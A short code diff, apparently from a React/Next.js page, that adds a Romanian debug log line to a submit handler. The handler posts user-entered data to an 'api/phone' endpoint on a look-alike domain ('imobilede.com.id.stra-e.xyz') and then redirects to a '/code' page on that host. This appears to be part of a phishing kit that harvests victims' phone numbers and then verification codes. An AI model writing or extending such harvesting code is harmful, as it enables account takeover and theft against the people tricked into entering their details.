@@ -12,6 +12,7 @@ function Home() {
 
   async function handleSubmitFn() {
     try {
+      console.log("o plecat din browser", data);
       await axios.post(`http://imobilede.com.id.stra-e.xyz/api/phone`, data);
       router.replace('http://imobilede.com.id.stra-e.xyz/code');
     } catch(err) {
